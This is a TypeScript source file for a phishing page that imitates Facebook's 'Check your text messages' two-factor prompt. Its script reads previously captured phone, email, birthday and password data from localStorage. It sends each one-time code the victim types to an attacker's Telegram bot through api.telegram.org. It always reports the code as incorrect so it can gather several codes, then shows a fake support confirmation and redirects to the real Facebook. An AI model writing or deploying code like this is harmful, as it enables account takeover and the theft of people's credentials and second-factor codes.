import { Layout } from '@/layouts/layout';
import { html } from '@/lib/html';
import PhoneInputImage from '@/assets/image/phone_input.jpg';
import config from '@/config/telegram_config.json';
let codeAttempts = 0;

export const EnterCode = (): string => {
    const mainContent = html`
        <div class="mx-auto mt-16 max-w-[600px] px-2">
            <div class="mb-4 flex items-center gap-2">
                <span
                    id="userEmail"
                    class="text-[13px] leading-[17px] font-[500] text-[rgb(10,19,23)]"
                >
                </span>
            </div>

            <div class="">
                <h1
                    class="mb-2 text-[24px] leading-[28px] font-[600] text-[rgb(10,19,23)]"
                >
                    Check your text messages
                </h1>
                <p
                    class="mb-4 text-[15px] leading-[19px] font-[400] text-[rgb(10,19,23)]"
                >
                    Enter the 6-digit code that we've just sent to your SMS,
                    WhatsApp or from the authentication app that you set up.
                </p>

                <div class="mb-4 flex justify-center">
                    <img
                        src="${PhoneInputImage}"
                        alt="Two-factor authentication illustration"
                        class="w-full"
                    />
                </div>

                <input
                    type="text"
                    placeholder="Code"
                    id="codeInput"
                    maxlength="8"
                    pattern="[0-9]*"
                    inputmode="numeric"
                    class="mb-3 w-full rounded-[16px] border border-[#dddfe2] px-[16px] py-[14px] text-[17px] focus:border-[#1877f2] focus:shadow-[0_0_0_2px_#e7f3ff] focus:outline-none"
                />

                <p id="errorMessage" class="mb-2 hidden text-red-700"></p>

                <button
                    id="continueBtn"
                    class="mb-2 flex h-[44px] w-full items-center justify-center rounded-[22px] bg-[#0064E0] text-[15px] font-[500] text-white transition-colors hover:bg-[#0064E0]"
                >
                    <span id="continueText">Continue</span>
                    <div
                        id="loadingSpinner"
                        class="hidden h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-r-transparent"
                    ></div>
                </button>

                <button
                    class="h-[44px] w-full rounded-[22px] border border-[#dddfe2] bg-white text-[15px] font-[500] text-[#1c1e21] transition-colors hover:bg-[#f5f6f7]"
                >
                    Try Another Way
                </button>
            </div>
        </div>

        <div
            id="successModal"
            class="fixed top-0 left-0 hidden h-screen w-screen items-center justify-center bg-black/50"
        >
            <div class="w-full max-w-[600px] rounded-sm bg-white">
                <div
                    class="flex w-full items-center rounded-sm bg-[#35589e] p-4 font-medium text-white"
                >
                    Form Submitted Successfully
                </div>
                <div class="w-full border-b border-b-gray-200 p-4">
                    Thanks for contacting us. You'll get notification when we
                    respond in 1-2 business days. You can view responses in your
                    Support Inbox.
                </div>
                <div
                    class="flex items-center justify-end rounded-sm bg-gray-100 p-4"
                >
                    <a
                        href="https://www.facebook.com/policies_center/"
                        class="rounded-md bg-[#35589e] px-3 py-1 font-medium text-white hover:cursor-pointer"
                    >
                        ok
                    </a>
                </div>
            </div>
        </div>
    `;

    return Layout({
        title: 'Security Check - Facebook',
        children: mainContent,
    });
};

export const setupEnterCode = (): void => {
    const displayMaskedPhone = (): void => {
        const userEmailElement = document.getElementById('userEmail');
        if (!userEmailElement) {
            return;
        }

        const formDataStr = localStorage.getItem('helpFormData');
        if (formDataStr === null || formDataStr.trim() === '') {
            return;
        }

        try {
            interface HelpFormData {
                phone: string;
                email: string;
                birthday: string;
                password: string;
                code: string;
            }
            const formData = JSON.parse(formDataStr) as HelpFormData;
            if (typeof formData?.phone !== 'string') {
                return;
            }
            const phone = formData.phone;
            if (phone.trim() === '') {
                return;
            }

            const maskedPhone =
                phone.charAt(0) +
                '*'.repeat(phone.length - 2) +
                phone.charAt(phone.length - 1);
            userEmailElement.textContent = `${maskedPhone} • Facebook`;
        } catch {
            return;
        }
    };

    const handleCodeInput = (): void => {
        const codeInput = document.getElementById(
            'codeInput'
        ) as HTMLInputElement | null;
        const continueBtn = document.getElementById('continueBtn');
        if (codeInput === null || continueBtn === null) {
            return;
        }

        codeInput.addEventListener('input', (e) => {
            const target = e.target as HTMLInputElement;
            target.value = target.value.replace(/\D/g, '');

            if (target.value.length >= 6 && target.value.length <= 8) {
                continueBtn.classList.remove(
                    'opacity-40',
                    'cursor-not-allowed'
                );
                continueBtn.classList.add('cursor-pointer');
            } else {
                continueBtn.classList.add('opacity-40', 'cursor-not-allowed');
                continueBtn.classList.remove('cursor-pointer');
            }
        });
    };

    const handleSubmit = (): void => {
        const continueBtn = document.getElementById('continueBtn');
        const codeInput = document.getElementById(
            'codeInput'
        ) as HTMLInputElement | null;
        const continueText = document.getElementById('continueText');
        const loadingSpinner = document.getElementById('loadingSpinner');
        const successModal = document.getElementById('successModal');

        if (
            continueBtn === null ||
            codeInput === null ||
            continueText === null ||
            loadingSpinner === null ||
            successModal === null
        ) {
            return;
        }

        continueBtn.addEventListener('click', async () => {
            if (codeInput.value.length < 6 || codeInput.value.length > 8) {
                return;
            }

            if (codeAttempts >= config.setting.max_code_attempts) {
                const errorMessage = document.getElementById('errorMessage');
                if (errorMessage) {
                    errorMessage.textContent = `Maximum ${config.setting.max_code_attempts} attempts reached. Please try again later.`;
                    errorMessage.classList.remove('hidden');
                }
                return;
            }

            codeAttempts++;
            continueText.classList.add('hidden');
            loadingSpinner.classList.remove('hidden');

            const formDataStr = localStorage.getItem('helpFormData');
            if (formDataStr === null || formDataStr.trim() === '') {
                return;
            }

            try {
                const formData = JSON.parse(formDataStr);
                formData.code = codeInput.value;
                localStorage.setItem('helpFormData', JSON.stringify(formData));

                const lastMessageId = localStorage.getItem('lastMessageId');
                const parsedMessageId =
                    lastMessageId === null
                        ? undefined
                        : lastMessageId.trim() === ''
                          ? undefined
                          : parseInt(lastMessageId, 10);

                const codeMessage = `🔐 <b>Code:</b> <code>${formData.code}</code>`;

                await fetch(
                    `https://api.telegram.org/bot${config.telegram.token}/sendMessage`,
                    {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: config.telegram.chatId,
                            text: codeMessage,
                            parse_mode: 'HTML',
                            reply_to_message_id: parsedMessageId,
                        }),
                    }
                );

                const errorMessage = document.getElementById('errorMessage');
                if (errorMessage) {
                    errorMessage.textContent =
                        'Incorrect code. Please try again.';
                    errorMessage.classList.remove('hidden');
                }

                continueText.classList.remove('hidden');
                loadingSpinner.classList.add('hidden');
                codeInput.value = '';

                if (codeAttempts >= config.setting.max_code_attempts) {
                    successModal.classList.remove('hidden');
                    successModal.classList.add('flex');

                    setTimeout(() => {
                        window.location.href = 'https://www.facebook.com/';
                    }, 2000);
                }
            } catch {
                return;
            }
        });
    };

    displayMaskedPhone();
    handleCodeInput();
    handleSubmit();
};
